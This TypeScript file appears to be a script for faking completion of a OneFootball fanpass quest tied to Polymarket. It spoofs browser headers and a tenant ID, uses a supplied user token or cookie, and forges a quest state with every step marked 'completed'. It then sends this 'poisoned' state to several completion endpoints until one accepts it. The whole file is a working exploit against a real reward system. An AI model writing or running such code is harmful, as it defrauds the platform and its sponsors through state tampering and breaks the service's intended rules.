import axios from 'axios';

const SUBDOMAIN_API = 'https://fanpass.proofchain.co.za';

function extractUserId(token: string): string | null {
  try {
    if (!token.startsWith('eyJ')) return null;
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
    return payload.sub || payload.user_id || payload.id || payload.uid || null;
  } catch (e) {
    return null;
  }
}

export async function pollAccountVerification(input: string): Promise<{ success: boolean; data?: any; message: string }> {
  try {
    const token = input.trim();
    const headers: Record<string, string> = {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://fanpass.onefootball.com',
      'Referer': 'https://fanpass.onefootball.com/',
      'X-Tenant-ID': 'tenant_1g6k1cew859ls7408',
      'Content-Type': 'application/json'
    };

    if (token.startsWith('eyJ')) {
      headers['Authorization'] = 'Bearer ' + token;
    } else {
      headers['Cookie'] = token;
    }

    const questId = '81ff3b8a-03bf-488c-828c-f60923e96149';
    const questName = 'Market Debut';
    const questSlug = 'kick-off-with-polymarket-us';
    const userId = extractUserId(token);

    const logs = [];

    // Step 1: Initialize user quest instance
    const startUrl = userId 
      ? `${SUBDOMAIN_API}/api/quests/${questId}/start?user_id=${userId}`
      : `${SUBDOMAIN_API}/api/quests/${questId}/start`;

    const startRes = await axios.post(startUrl, { questId }, {
      headers,
      timeout: 8000,
      validateStatus: () => true
    });

    logs.push({ step: 'START', status: startRes.status, response: startRes.data });

    const serverInstance = startRes.data || {};
    const userQuestId = serverInstance.id || '26ada2ca-8b24-4cc6-9566-b826026397ab';

    // Step 2: Force all step_progress keys (0, 1, 2, 3) to fully completed state
    const currentProgress = serverInstance.step_progress || {};
    const forcedStepProgress: Record<string, any> = {};
    
    const stepKeys = Object.keys(currentProgress).length > 0 ? Object.keys(currentProgress) : ["0", "1", "2", "3"];
    
    for (const key of stepKeys) {
      const targetVal = currentProgress[key]?.target || 1;
      forcedStepProgress[key] = {
        ...(currentProgress[key] || {}),
        count: targetVal,
        cumulative_value: targetVal,
        target: targetVal,
        completed: true,
        status: 'completed',
        completed_at: new Date().toISOString()
      };
    }

    const payload = {
      ...serverInstance,
      id: userQuestId,
      user_quest_id: userQuestId,
      quest_id: questId,
      questId: questId,
      slug: questSlug,
      name: questName,
      status: 'completed',
      current_step: stepKeys.length,
      steps_completed: stepKeys.length,
      total_steps: stepKeys.length,
      completion_percentage: 100,
      step_progress: forcedStepProgress,
      completed_at: new Date().toISOString()
    };

    // Step 3: Fire against primary completion endpoints with the fully poisoned state
    const endpoints = [
      `${SUBDOMAIN_API}/api/quests/verify`,
      `${SUBDOMAIN_API}/api/quests/submit`,
      `${SUBDOMAIN_API}/api/quests/complete`
    ];

    let completed = false;
    let winningResult = null;

    for (const url of endpoints) {
      const res = await axios.put(url, payload, {
        headers,
        timeout: 8000,
        validateStatus: () => true
      });

      logs.push({ 
        attempt: `PUT ${url}`, 
        status: res.status, 
        response: res.data 
      });

      if (res.status >= 200 && res.status < 300) {
        completed = true;
        winningResult = { url, response: res.data };
        break;
      }
    }

    return {
      success: true,
      data: { userQuestId, completed, winningResult, logs },
      message: completed ? '🚀 Polymarket Quest Fully Completed & Ticked!' : '⚡ Sequence dispatched. Check response logs.'
    };

  } catch (error: any) {
    return { 
      success: false, 
      data: { error: error.message },
      message: '❌ Engine Error: ' + error.message 
    };
  }
}
